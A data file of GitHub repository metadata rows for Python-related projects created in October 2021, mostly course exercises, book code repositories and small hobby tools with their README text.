417218419;python-for-NLP;https://github.com/momoyo-droid/python-for-NLP;Python;2021-10-14T17:12:03Z;0;0;0;python-for-NLP Python codes made for the Natural Language Processing course offered by Professor Thiago Pardo of the University of São Paulo (São Carlos campus) 
417218448;Python-akademie-prj1;https://github.com/xhorva04/Python-akademie-prj1;Python;2021-10-14T17:12:07Z;0;0;0;
417242986;Jet_Brains_Python;https://github.com/WhitePunkOnDope/Jet_Brains_Python;;2021-10-14T18:34:40Z;0;0;0;
417280694;python-random-quote;https://github.com/Tns777/python-random-quote;Python;2021-10-14T21:00:10Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417275723;EjerciciosPython_poo;https://github.com/Alejandro-Moles/EjerciciosPython_poo;Python;2021-10-14T20:39:15Z;0;0;0;
417306104;Pythons-Review---Part-1;https://github.com/janetmz/Pythons-Review---Part-1;Jupyter Notebook;2021-10-14T23:02:00Z;0;0;0;Pythons-Review---Part-1 
417313355;Python-Working-with-Form;https://github.com/parvej35/Python-Working-with-Form;Python;2021-10-14T23:42:53Z;0;0;0;Python-Working-with-Form https://www.youtube.com/watch?v=svcv8uub0D0 
417217980;tio-python-viewer;https://github.com/twinleaf/tio-python-viewer;Python;2021-10-14T17:10:40Z;0;0;0;Twinleaf-Python-Viewer Provides a Python GUI to view sensor data.  Currently works for our VMR magnetometers and SYNC units.  This program is newly created, and we are working to find and fix bugs. Known Bugs:  If used with a single VMR without a SYNC unit, there are momentary pauses in the graph animation  Setting Up the GUI To use this viewer, type: % pip3 install tl_pyview  Then, run the program with the command % tl_pyview [usb-path]  where [usb-path] is replaced by the port path specific to your setup.  For MacOS, the path will be in the form /dev/cu.usbXXXXX.  For Linux, it will be in the form /dev/ttyUSB0 or /dev/ttyACM.  For Windows, it will look like COMX.  Visit our Getting Started page for more details. 
417203088;Python-T1;https://github.com/karina-nosenko/Python-T1;Python;2021-10-14T16:23:50Z;0;0;0;
417243288;Python-IP-camera;https://github.com/mlillas/Python-IP-camera;Python;2021-10-14T18:35:42Z;1;1;0;Python-IP-camera One Time Setup:  Install latest Python version if you don't have it Run 'requirements.bat' Edit login details in 'config.py' Edit videoCapture url/rtsp inside 'capture.py' (Must be in the right format for your specific IP camera)  Start Program:  Run 'start.bat'  Created By: Mats Lillas 
417245836;tukulelunch-django-python;https://github.com/AsinineFatuity/tukulelunch-django-python;Python;2021-10-14T18:45:04Z;0;0;0;tukulelunch-django-python A web app to help members pledge and commit to Sabbath lunch items 
417285296;Python-developer-roadmap;https://github.com/ErdemOzgen/Python-developer-roadmap;;2021-10-14T21:19:26Z;0;0;0;"Python Developer Roadmap  Roadmap to becoming a Python developer in 2021-2022: Below you can find a chart demonstrating the paths that you can take and the libraries that you would want to learn to become a Python developer. I made this chart as a tip for everyone who asks me, ""What should I learn next as a Python developer?""  Disclaimer  The purpose of this roadmap is to give you an idea about the landscape. The road map will guide you if you are confused about what to learn next, rather than encouraging you to pick what is hype and trendy. You should grow some understanding of why one tool would be better suited for some cases than the other and remember hype and trendy does not always mean best suited for the job.  Give a Star! ⭐ If you like or are using this project to learn or start your solution, please give it a star. Thanks! Roadmap  TODO:  Add Microservices Good to Know Libraries Add API Clients Add extra subtree for data process and data manipulation Add for ML & DL subtree  Resources   Prerequisites  Python Python Modules SQL    General Development Skills  Learn GIT, create a few repositories on GitHub, share your code with other people Know HTTP(S) protocol, request methods (GET, POST, PUT, PATCH, DELETE, OPTIONS) Don't be afraid of using Google, Power Searching with Google Read a few books about algorithms and data structures Learn about implementation of a basic Authentication Solid principles, architectural & design patterns, ecc Basics of software testing (unit, integration, e2e)    CLI Tools  google/python-fire click    Web Frameworks + Routers  Flask Django    Databases   Relational  SQL Server PostgreSQL MariaDB MySQL    Cloud Databases  CosmosDB DynamoDB    Search Engines  ElasticSearch Solr Sphinx    NoSQL  MongoDB Redis Apache Cassandra RavenDB CouchDB      ORMs  Django ORM SQLAlchemy Extra    Caching  Memcached Distributed Cache  Redis Memcached      Logging  Log Frameworks  Delgan/loguru Coloredlogs    Log Management System  Sentry.io Loggly.com   Distributed Tracing  Jaeger      Real-Time Communication  SignalPy Socket.IO    API Clients   REST   GraphQL     Good to Know   Testing  Unit, Behavior, Integration Testing  Pytest-mock Testify Robot Pytest Doctest Pytest-bdd Cucumber Dockertest   E2E Testing  Selenium Endly      Task Scheduling  scedule Advanced Python Scheduler    MicroServices   Message-Broker  RabbitMQ Apache Kafka ActiveMQ Azure Service Bus    Building message-driven   Frameworks   RPC     Python-Patterns   Wrap Up If you think the roadmap can be improved, please do open a PR with any updates and submit any issues. Also, I will continue to improve this, so you might want to star this repository to revisit. Idea from : Go developer roadmap Contribution The roadmap is built using Draw.io. Project file can be found at python-developer-roadmap.xml file. To modify it, open draw.io, click Open Existing Diagram and choose xml file with project. It will open the roadmap for you. Update it, upload and update the images in readme and create a PR (export as png with 400% zoom and minify that with Compressor.io).  Open a pull request with improvements Discuss ideas in issues Spread the word  "
417272711;quoteTrackerPython;https://github.com/joeknit/quoteTrackerPython;;2021-10-14T20:26:42Z;0;0;0;
417207995;Python-for-Data-Analysis;https://github.com/nanayaw10/Python-for-Data-Analysis;;2021-10-14T16:39:57Z;0;0;0;
417222954;Python_Basit_Ornekler;https://github.com/LayLayina/Python_Basit_Ornekler;Python;2021-10-14T17:26:56Z;0;0;0;Python_Basit_Ornekler Python dilindeki giriş seviyesi basit örneklerden oluşan bir depodur.  İnstagram : arslankasimcan_ 
417260955;python-project-lvl2;https://github.com/MarinaIlina893/python-project-lvl2;Python;2021-10-14T19:40:14Z;0;0;0;Hexlet tests and linter status:  Maintainability status:  Test Coverage status:  
417313234;DataScienceWithPython;https://github.com/asrithak9/DataScienceWithPython;Jupyter Notebook;2021-10-14T23:42:15Z;0;0;0;
417245016;python-file-sorting;https://github.com/Francisco-Cavasan/python-file-sorting;Python;2021-10-14T18:41:58Z;0;0;0;Implementation of quicksort and merge sort in python to sort and merge two files containing a list of unordered numbers. 
417202908;MyT1-python-;https://github.com/NoyShabo/MyT1-python-;Python;2021-10-14T16:23:15Z;0;0;0;MyT1-python- 
417213122;weather-info-using-python;https://github.com/dhimanparas20/weather-info-using-python;Python;2021-10-14T16:55:52Z;0;0;0;Weather info. using Python  using the power of api this script can tell you the weather info of any place aroung the globe.  Banner   Files to edit NOTHING :-) Changelog:  init  Installation and Running Linux: git clone  git@github.com:dhimanparas20/weather-info-using-python.git && cd weather* python3 main.py Notes Dont edit this script if you hav 0 knowledge about python and bash . Dont be a gey by copying or importing this repo and calling it yours . Any changes for betterment are welcome, If you liked the script or need any kind of help , ping me up  https://t.me/ken_kaneki_69 Im not responsible for any of your data losses , do it at your own will . 
417260383;Curso_Python_Udemy;https://github.com/saak01/Curso_Python_Udemy;Python;2021-10-14T19:37:55Z;0;0;0;
417230381;python-ds-practice;https://github.com/cynthicrush/python-ds-practice;Python;2021-10-14T17:51:51Z;0;0;0;
417316597;next-python-desafio;https://github.com/T14g0Ferreira/next-python-desafio;;2021-10-15T00:00:51Z;1;1;0;
417203501;Simple-Python-Projects;https://github.com/NikaelaBalla/Simple-Python-Projects;Python;2021-10-14T16:25:15Z;0;0;0;Simple-Python-Projects This are some simple Python projects, I have created to document them. 
417243034;DSA-in-python;https://github.com/manas-v/DSA-in-python;Jupyter Notebook;2021-10-14T18:34:49Z;0;0;0;DSA in Python 
417271524;Design-Patterns-in-Python;https://github.com/SnehaKK/Design-Patterns-in-Python;;2021-10-14T20:21:43Z;0;0;0;Design Patterns in Python This is a consolidated this space to write all the patterns described in the awesome book 'Head First Design Patterns' in Python. The book is available to read here. Another cool resource for python design pattern is by Brandon Rhodes. Google Codelabs Tools Read More about how to create tutorials using the Google CodeLabs CLaaT here. Want to read the easy and excellent tutorial instead? References Some other projects on Github, gathered here for consolidated reference.  Miguel Alba's project. Read this is a fantastic Resource. Good read on medium about Strategy Pattern here. AJ Brazoz's project. jtortorelli's github project on design patterns.  Object Oriented Python references: As answered on Quora. Markdown CheatSheet 
417269314;python-openapi-parser;https://github.com/kwennerImpinj/python-openapi-parser;Python;2021-10-14T20:12:41Z;0;0;0;python-openapi-parser 
417245269;LowestCommonAncestorPython;https://github.com/Level-1-Developer/LowestCommonAncestorPython;Python;2021-10-14T18:42:54Z;0;0;0;LowestCommonAncestorPython BST with LCA functionality using python. 
417220722;python-web-refresher;https://github.com/levimurici/python-web-refresher;Python;2021-10-14T17:19:21Z;0;0;0;https://selenium-python.readthedocs.io/installation.html pip3 install --upgrade requests 
417262508;TestRailPythons;https://github.com/Sehqa/TestRailPythons;;2021-10-14T19:46:08Z;0;0;0;TestRailPython Для работы теста необходимо в переменные окружения API_LOGIN и API_PASS добавить свой логин и пароль от test rail соответственно. 
417284769;Git-Python-Interface;https://github.com/jocon15/Git-Python-Interface;Python;2021-10-14T21:16:59Z;0;0;0;Git Interface for Python Welcome to the git repository for the Python-Git Interface. The GitInterface class provides an easy-to-use function set for dealing with the Git Bash from Python. With GitInterface, you can save yourself from having to repetitively type in git commands. GitInterface makes tasks that require upload/download with git easy to automate using Python. GitInterface provides support for basic git commands with more on the way! To use this module, you should have the git bash downloaded and a repository setup and ready to be automated. Now you can just import the class and git started. Install pip install pygitinterface  Contents    File Description     README this file   git_interface.py houses the GitInterface class.    Currently Supported git Commands    Comamnd Description     add add files to staging area   branch create a branch of current branch   checkout checkout a branch   commit commit changes to local repository   pull pull updates from remote repository   push send updates to remote repository   rebase rebase branch with another branch   status get the status of the local repository    Example from pygitinterface import GitInterface  g = GitInterface('C:/your_local_repository_path') g.commit('Bug fixes') g.push('master')  
417224873;python_data_analysis;https://github.com/mina19/python_data_analysis;Jupyter Notebook;2021-10-14T17:33:00Z;0;0;0;Python Data Analysis - Third Edition  This is the code repository for Python Data Analysis - Third Edition, published by Packt. Perform data collection, data processing, wrangling, visualization, and model building using Python What is this book about? Data analysis enables you to generate value from small and big data by discovering new patterns and trends, and Python is one of the most popular tools for analyzing a wide variety of data. With this book, you’ll get up and running using Python for data analysis by exploring the different phases and methodologies used in data analysis and learning how to use modern libraries from the Python ecosystem to create efficient data pipelines. This book covers the following exciting features:  Explore data science and its various process models Perform data manipulation using NumPy and pandas for aggregating, cleaning, and handling missing values Create interactive visualizations using Matplotlib, Seaborn, and Bokeh Retrieve, process, and store data in a wide range of formats Understand data preprocessing and feature engineering using pandas and scikit-learn  If you feel this book is for you, get your copy today!  Instructions and Navigations All of the code is organized into folders. For example, Chapter02. The code will look like the following: # Creating an array import numpy as np a = np.array([2,4,6,8,10])  print(a)  Following is what you need for this book: This book is for data analysts, business analysts, statisticians, and data scientists looking to learn how to use Python for data analysis. Students and academic faculties will also find this book useful for learning and teaching Python data analysis using a hands-on approach. A basic understanding of math and working knowledge of the Python programming language will help you get started with this book. With the following software and hardware list you can run all code files present in the book (Chapter 1-18). Software and Hardware List    Chapter Software required OS required     1 Install Python 3.7 with latest Anaconda environment Windows, Mac OS X, and Linux (Any)   2 Install  Python numerical computing library NumPy Windows, Mac OS X, and Linux (Any)   3 Install  Python data analysis library Pandas Windows, Mac OS X, and Linux (Any)   4 Install  Python  scientific computing  library SciPy Windows, Mac OS X, and Linux (Any)   5 Install  Python-MySQL connection library PyMySQ Windows, Mac OS X, and Linux (Any)   6 Install  Python-MySQL connection library mysql-connector Windows, Mac OS X, and Linux (Any)   7 Install  Python-MongoDB connection library PyMongo Windows, Mac OS X, and Linux (Any)   8 Install  Python-Cassandra connection library cassandra-driver Windows, Mac OS X, and Linux (Any)   9 Install  Python-Redis connection library redis Windows, Mac OS X, and Linux (Any)   10 Install  python visualization library matplotlib Windows, Mac OS X, and Linux (Any)   11 Install  python visualization library seaborn Windows, Mac OS X, and Linux (Any)   12 Install  python visualization library Bokeh Windows, Mac OS X, and Linux (Any)   13 Install python natural language processing library Scikit-learn Windows, Mac OS X, and Linux (Any)   14 Install python natural language processing library NLTK Windows, Mac OS X, and Linux (Any)   16 Install natural language processing library SpaCy Windows, Mac OS X, and Linux (Any)   17 Install image processing library OpenCV Windows, Mac OS X, and Linux (Any)   18 Install parallel computing library Dask Windows, Mac OS X, and Linux (Any)    We also provide a PDF file that has color images of the screenshots/diagrams used in this book. Click here to download it. Related products    Practical Data Analysis Using Jupyter Notebook [Packt] [Amazon]   Essential Statistics for Non-STEM Data Analysts [Packt] [Amazon]   Get to Know the Authors Avinash Navlani has over 8 years of experience working in data science and AI. Currently, he is working as a senior data scientist, improving products and services for customers by using advanced analytics, deploying big data analytical tools, creating and maintaining models, and onboarding compelling new datasets. Previously, he was a university lecturer, where he trained and educated people in data science subjects such as Python for analytics, data mining, machine learning, database management, and NoSQL. Avinash has been involved in research activities in data science and has been a keynote speaker at many conferences in India. Armando Fandango creates AI-empowered products by leveraging his expertise in deep learning, machine learning, distributed computing, and computational methods and has provided thought leadership roles as the chief data scientist and director at start-ups and large enterprises. He has advised high-tech AI-based start-ups. Armando has authored books such as Python Data Analysis - Second Edition and Mastering TensorFlow, Packt Publishing. He has also published research in international journals and conferences. Ivan Idris has an MSc in experimental physics. His graduation thesis had a strong emphasis on applied computer science. After graduating, he worked for several companies as a Java developer, data warehouse developer, and QA analyst. His main professional interests are business intelligence, big data, and cloud computing. Ivan Idris enjoys writing clean, testable code and interesting technical articles. Ivan Idris is the author of NumPy 1.5. Beginner's Guide and NumPy Cookbook by Packt Publishing. You can find more information and a blog with a few NumPy examples at ivanidris.net. Other books by the authors  Python Data Analysis - Second Edition Python Data Analysis Cookbook  Suggestions and Feedback Click here if you have any feedback or suggestions. 
417217403;Seenka-Python-Justify;https://github.com/Demonliquid/Seenka-Python-Justify;Python;2021-10-14T17:08:41Z;0;0;0;Seenka-Python-Justify More info: https://www.notion.so/Justificar-un-texto-0e74c45623454159a444a1f1d8a81695 El siguiente codigo:  No utiliza librerias, solo linters: black, isort, mypy y flake8 Codigo en spanglish: codigo en ingles, comentarios español/ingles a falta de indicacion. Se ejecuta desde el main. No contiene Docker, Pipfile o Test a falta de dependencias. (test usaria Pytest). Por simplicidad usa solo main branch. Por razon de tiempo se define solamente data type de los argumentos de la funcion y no de variables locales.  
417205458;LCA-with-Python;https://github.com/Kinjal-16/LCA-with-Python;Python;2021-10-14T16:31:31Z;0;0;0;LCA-with-Python. I have the program to find the lca of two nos along with the program for unit testing in '/.idea/Src/Insertion.py' and '/.idea/Src/Test.py' respectively. I have used IntellijIdea to make this project 
417244018;c-python-applications;https://github.com/Apress/c-python-applications;C;2021-10-14T18:38:06Z;0;0;0;Apress Source Code This repository accompanies C and Python Applications by Philip Joyce (Apress, 2022).  Download the files as a zip using the green button, or clone the repository to your machine using Git. Releases Release v1.0 corresponds to the code in the published book, without corrections or updates. Contributions See the file Contributing.md for more information on how you can contribute to this repository. 
417239409;Python-Basics-Operators;https://github.com/KreativeKaruna/Python-Basics-Operators;Jupyter Notebook;2021-10-14T18:22:16Z;0;0;0;
417202208;App-Rating-Project-Python;https://github.com/prabhkaurr/App-Rating-Project-Python;Jupyter Notebook;2021-10-14T16:21:00Z;0;0;0;App-Rating-Project-Python 
417201967;classroom-hahow-pythonfiftyplus;https://github.com/datainpoint/classroom-hahow-pythonfiftyplus;;2021-10-14T16:20:21Z;0;0;0;classroom-hahow-pythonfiftyplus Classroom: Hahow Python Fifty Plus 
417202700;Scientific-programming-in-Python;https://github.com/BaderDak0/Scientific-programming-in-Python;;2021-10-14T16:22:35Z;0;0;0;
417272036;CMPE120PYTHONHW;https://github.com/VidhyutG/CMPE120PYTHONHW;Python;2021-10-14T20:23:58Z;0;0;0;https://github.com/VidhyutG 
417313441;python-random-quote;https://github.com/dominic-dc/python-random-quote;Python;2021-10-14T23:43:13Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417302303;nftlabs-python-sdk-example;https://github.com/nftlabs/nftlabs-python-sdk-example;Python;2021-10-14T22:42:49Z;0;0;0;NftLabs Python SDK Sample Project  Only supports Python version >= 3.6  Built on top of the NftLabs Python sdk Install via pip: $ pip install nftlabs-sdk 
417305722;ML-python-course;https://github.com/Jiovana/ML-python-course;Jupyter Notebook;2021-10-14T23:00:37Z;0;0;0;ML-python-course Google Colab files 
417254524;python-weight-loss-app;https://github.com/mikesalzarulo/python-weight-loss-app;Python;2021-10-14T19:15:29Z;0;0;0;python-weight-loss-app python-weight-loss-app displays a menu for the user where they can ask for weight loss advice or print a table of weight loss projection over the following six months. 
417241716;MT-Python-Projects;https://github.com/mccordthomas/MT-Python-Projects;;2021-10-14T18:30:15Z;0;0;0;MT-Python-Projects 
417201493;python-random-quote;https://github.com/Arvin132/python-random-quote;Python;2021-10-14T16:19:01Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417203542;hi...-welcome-to-python-;https://github.com/Divyakaranamm/hi...-welcome-to-python-;Python;2021-10-14T16:25:24Z;0;0;0;hi...-welcome-to-python- 
417303469;Data_Exploration-with-Python;https://github.com/shadow-27/Data_Exploration-with-Python;Jupyter Notebook;2021-10-14T22:48:23Z;0;0;0;Data_Exploration-with-Python In this Project I learn the basics of Python and follow  FreeCodeCamp Course to learn Data Analysis using python. I used a salesdata of Cycle shop which was provided in that lecture and then learnt all the basics of Data exploration using PANDAS and tried to make graphs using MATPLOT library to derive some insights on what kind of data I'm working on and check if there is some dirty data. 
417207105;python_pro_m6;https://github.com/GBatisaldo/python_pro_m6;Python;2021-10-14T16:36:53Z;0;0;0;python_pro_m6  Utilizando o FastApi para criar minha primeira api no python, assim utilizando um exercicio de POST.  
417227810;simple-chat-bot-python;https://github.com/demosusanto/simple-chat-bot-python;Jupyter Notebook;2021-10-14T17:43:08Z;0;0;0;Starter simple BotChat.  UAS Sistem Penunjang Keputusan. Demo Susanto 07TPLE011 Universitas Pamulang - Teknik Informatika  Prerequisites  Python Python 3.8.8 Anaconda conda 4.10.3  Dependencies :   audioplayer 0.6   If you don't have administrator privileges, install in your home folder.   pip3 install audioplayer --user   gTTS 2.2.3   pip install gTTS   Installation $ git clone https://github.com/demosusanto/simple-chat-bot-python.git $ cd Python $ cd ChatBot $ C:\Python\ChatBot>pip3 install audioplayer --user $ C:\Python\ChatBot>pip install gTTS 
417229961;docker-compose-python;https://github.com/headllama/docker-compose-python;Python;2021-10-14T17:50:27Z;0;0;0;Simples código que cria uma aplicação utilizando o Flask e o MySQL Utilização: Após clonar esse repositório em sua máquina local, basta rodar o comando docker-compose up, após isso, acesse a página localhost:5000 em seu navegador, ao acessar, você conseguirá ler a tabela mysql criada no arquivo init.sql. Para sair, somente basta dar um CRTL+C em seu terminal. Apresentação da aplicação: Como boas práticas, o container somente deverá ser responsável por apenas um processo, para essa aplicação precisaremos de dois containers - um para rodar a aplicação e outro para o database - para isso utilizaremos o Docker-Compose Esse programa contém dois arquivos principais: app.py - um simples programa flask que se comunica com o database e expõe um endpoit e o init.sql - um script SQL que inicializa o database antes da criação do programa. Foi criado um Dockerfile para o app, que por consequência irá criar uma imagem e, por fim, um container - cuja descrição dos passos estão bem documentados no container em si - basicamente utilizaremos a imagem 3.6 do Python e expomos a porta 5000, copiamos os arquivos app.py e requirements.txt para um diretório utilizado em nossa aplicação e por fim a instalação dos pacotes necessários para sua utiização. O arquivo principal - docker-compose.yaml utiliza dos serviços: A app e o database MySQL. Os pontos chave desse arquivo são:  image: Representa uma imagem docker oficial existente do MySQL environment: É utilizada para adicionar variáveis de ambiente ports: Especifica as portas utilizadas - local e no container - escolhi essa porta alta para não ter conflito com alguma porta comum, eventualmente utilizada em sua máquina volumes: Como nós queremos que o container seja utilizado com nosso db, nós conectamos o diretório que contém o init.sql nesse container. O volume também é utilizado para persistir os dados, como você pode ver na Documentação oficial  Também conseguimos acessar o database diretamente de nosso terminal através do comando mysql --host=127.0.0.1 --port=32000 -u root -p 
417291716;dummy-python-lib;https://github.com/brunoacpcosta/dummy-python-lib;Python;2021-10-14T21:50:06Z;0;0;0;dummy-python-lib Python Lib that shows commits https://github.com/insper/dev-aberto/ 
417300160;python_hw1;https://github.com/kimnguyen4497/python_hw1;Python;2021-10-14T22:31:11Z;0;0;0;https://github.com/kimnguyen4497/python_hw1 
417292789;Python-Project-Lessons;https://github.com/jllewis11/Python-Project-Lessons;Python;2021-10-14T21:55:02Z;0;0;0;
417314979;CursoBasicoPython;https://github.com/jeigar2/CursoBasicoPython;Python;2021-10-14T23:51:59Z;0;0;0;CursoBasicoPython Clases del Curso Básico de Python, Instruido por: Facundo García Martoni Platzi juego fizzBuzz Variante del juego fizz buzz  Si es divisble entre 3 fizz Si es divisible entre 5 buzz Si es divisible entre 3 y 5 fizzBuzz Si es divisible entre 7 saltar número Si llega a 42 escribir cuarenta y dos y finalizar  Pregunta hasta que número se quiere llegar. Salida introduce el número límite del juego: 44 1 2 'fizz' 4 'buzz' 'fizz' 8 'fizz' 'buzz' 11 'fizz' 13 'fizzBuzz' 16 17 'fizz' 19 'buzz' 22 23 'fizz' 'buzz' 26 'fizz' 29 'fizzBuzz' 31 32 'fizz' 34 'fizz' 37 38 'fizz' 'buzz' 41 cuarenta y dos 
417205320;msys2-python-cryptography;https://github.com/mugiseyebrows/msys2-python-cryptography;Shell;2021-10-14T16:31:03Z;0;0;0;About python-cryptography dependency graph (excluding build tools and check tools):  Build Open msys2 shell and clone this repository preserving line endings (assuming you have core.autocrlf=true in global config): git clone https://github.com/mugiseyebrows/msys2-python-cryptography.git --config core.eol=lf cd msys2-python-cryptography Build and install packages sh build-and-install.sh  
417216063;kaniko-pod-python-backend;https://github.com/GSA-COMET-Technical-Challenge/kaniko-pod-python-backend;;2021-10-14T17:04:29Z;0;0;0;kaniko-pod-python-backend 
417286220;python_Gerente_Youtube;https://github.com/Misteridmir/python_Gerente_Youtube;Python;2021-10-14T21:23:59Z;0;0;0;
417244601;python-csv-generator;https://github.com/victoraugusto6/python-csv-generator;Python;2021-10-14T18:40:30Z;0;0;0;python-csv-generator Generator CSV in Python using loop and Faker 
417279052;BlogManagerPython;https://github.com/et-mohedano/BlogManagerPython;Python;2021-10-14T20:53:06Z;0;0;0;
417214662;python-design-patterns;https://github.com/caseybackes/python-design-patterns;Python;2021-10-14T17:00:34Z;0;0;0;python-design-patterns Personal notebook/journal for learning and implementing python design patterns. 
417308114;Python-Review---Part-1;https://github.com/pleun111/Python-Review---Part-1;Jupyter Notebook;2021-10-14T23:12:28Z;0;0;0;Python-Review---Part-1 
417202915;Python-Web-Automation;https://github.com/hyoney-moon/Python-Web-Automation;;2021-10-14T16:23:17Z;0;0;0;
417238879;Python_2_Educateperu;https://github.com/AaronCGU/Python_2_Educateperu;;2021-10-14T18:20:31Z;0;0;0;Python_2_Educateperu 
417258686;data-science-solutions-python;https://github.com/Apress/data-science-solutions-python;Jupyter Notebook;2021-10-14T19:31:15Z;0;0;0;Apress Source Code This repository accompanies Data Science Solutions with Python by Tshepo Chris Nokeri (Apress, 2022).  Download the files as a zip using the green button, or clone the repository to your machine using Git. Releases Release v1.0 corresponds to the code in the published book, without corrections or updates. Contributions See the file Contributing.md for more information on how you can contribute to this repository. 
417227252;Basic-Python-Projects;https://github.com/jmhuertasg/Basic-Python-Projects;Python;2021-10-14T17:41:20Z;0;0;0;Basic-Python-Projects projects in Python - Basic 1-Hangman Game in Python – Simple Game Project for Beginners First, let’s check the steps to build the Hangman game in Python:   Importing the random and time modules.   Defining functions with specific global arguments.   Implementing loops to execute the program.   Passing the function in the program to run. So that is basically what we will do in this Python project. Let’s start. 1.1 Importing the random and time libraries. 1.2 Define the main function. 1.3 Develop a loop to execute the game again. 1.4 Initialize conditions for hangman game 1.5 The rest of the whole hangman program combined together. 1.6   2- 
417313820;python-random-quote;https://github.com/Zuzy1/python-random-quote;Python;2021-10-14T23:45:18Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417310389;Python-binary-tree-traversals;https://github.com/isaccanedo/Python-binary-tree-traversals;Python;2021-10-14T23:25:53Z;0;0;0;Python-binary-tree-traversals :run: Em ciência da computação, a travessia de árvore (também conhecida como busca em árvore e caminhada na árvore) é uma forma de travessia de gráfico e se refere ao processo de visitar (por exemplo, recuperar, atualizar ou excluir) cada nó em uma estrutura de dados em árvore, exatamente uma vez. Essas travessias são classificadas pela ordem em que os nós são visitados. Os algoritmos a seguir são descritos para uma árvore binária, mas também podem ser generalizados para outras árvores. 
417316293;Python-DjangoWebforms;https://github.com/anvishnu1984/Python-DjangoWebforms;Python;2021-10-14T23:59:06Z;0;0;0;
417284177;Using-Databases-with-Python;https://github.com/abdullahgamal17/Using-Databases-with-Python;JavaScript;2021-10-14T21:14:11Z;0;0;0;
417203487;forks.green-api-python;https://github.com/growersun/forks.green-api-python;Python;2021-10-14T16:25:11Z;0;0;0;
417203778;python-databricks-sample;https://github.com/sbormolini/python-databricks-sample;Python;2021-10-14T16:26:12Z;0;0;0;python-databricks-sample Collection of python scripts used by databricks 
417293797;Simply_Python_JDB;https://github.com/Arsybai/Simply_Python_JDB;Python;2021-10-14T21:59:55Z;1;1;0;Simply Python JDB  I made this just for personal purpose. but I think it's OK to share it. it's a simple database with python json (inspired by MYSQL) well OK thanks for wasting your time... 
417269068;python-for-dummies;https://github.com/PFadel/python-for-dummies;Python;2021-10-14T20:11:37Z;0;0;0;python-for-dummies Me teaching python to my friends 
417241081;Tirgol1Python;https://github.com/AmirAvidan/Tirgol1Python;Python;2021-10-14T18:28:04Z;0;0;0;
417303643;python_data_analysis;https://github.com/rohitkathariya/python_data_analysis;Python;2021-10-14T22:49:16Z;0;0;0;python_data_analysis 
417226326;directory-tree-generator-python;https://github.com/venkateshwara-gopisetti/directory-tree-generator-python;Python;2021-10-14T17:38:02Z;0;0;0;directory_tree Build a Python Directory Tree Generator for the Command Line. Based on this tutorial from Leodanis Pozo Ramos from Realpython  In the project’s root directory, you’ll find the following files:   README.md provides the project description and instructions on installing and running the application. Adding a descriptive and detailed README file to your projects is considered a best practice in programming, especially if you’re planning to release the project as an open source solution.   tree.py provides an entry-point script for you to run the application.   Then you have the rptree/ directory that holds a Python package with three modules:  rptree.py provides the application’s main functionalities. __init__.py enables rptree/ as a Python package. cli.py provides the command-line interface for the application.      DISCLAIMER  The material in this project is entirely taken from the above mentioned source - Realpython as provided. This is entirely for practice. I am not liable about any issues that would follow up from the source i.e. Realpython. In that case, please reach out to them. In case of copyright infringement, please notify me and we can resolve the issue. 
417269570;Python-Data-Structures;https://github.com/marcysko/Python-Data-Structures;Python;2021-10-14T20:13:41Z;0;0;0;Python-Data-Structures Description Knowledge of data structures and the algorithms which they support helps developers choose the most suitable solution for a given context, making them better programmers who stand out to their company, clients, or prospective employers. This course uses a combo of visual, theoretical, and hands-on programming approaches to explain concepts in a fun and accessible way. It explains some of the most important data structures such as stacks, queues, and priority queues, and how these are used by search algorithms such as depth-first search, breadth-first search, and the A-star (A*) algorithm. Also shows how to trace the execution of algorithms. 
417218908;SWENG-LCA-Python;https://github.com/AdhocSarah/SWENG-LCA-Python;Python;2021-10-14T17:13:28Z;0;0;0;
417260206;Python-Data-Structures;https://github.com/ChaosNeon/Python-Data-Structures;Python;2021-10-14T19:37:08Z;0;0;0;Python-Data-Structures Code made during the python data structures course 
417205316;Hangman-in-Python;https://github.com/oatya/Hangman-in-Python;Python;2021-10-14T16:31:03Z;0;0;0;Hangman in Python I've done this school team project at Codecool's tester course. Story Let's hang somebody! Implement the popular Hangman game. Tasks   Implement the play(word, lives) function as a basic hangman game.  The function uses the word parameter as the word to guess and the lives parameter as the number of available mistakes. The initial game state is displayed as _ _ _ _ _ _ _ _ (one underscore for each letter in word). The game state is displayed as _ o d _ _ o o _ if letters 'd' and 'o' are revealed. It is possible to make guesses, and letters that occur in the word are revealed. When a guessed letter does not occur in word, the player loses one life. When a guess is repeated (regardless of its occurrences), the player is notified, and nothing happens. When a guess is wrong (either a new or a repeated letter), the previous wrong letters are shown to the user. The player wins when all letters in word are revealed. The player loses when the number of wrong guesses is higher than the value of lives (not counting repeated guesses). When the player types 'quit' as input, the program says good-bye and terminates.    The game uses a random word from a pre-defined word collection.  The game randomly picks a word at each run. The game randomly picks a country from countries-and-capitals.txt.    
417205374;52ProblemsSolving_Python;https://github.com/imdadulhaque1/52ProblemsSolving_Python;Jupyter Notebook;2021-10-14T16:31:13Z;0;0;0;
417202449;Basic-python-projects;https://github.com/Saravanan-SD/Basic-python-projects;Python;2021-10-14T16:21:41Z;0;0;0;
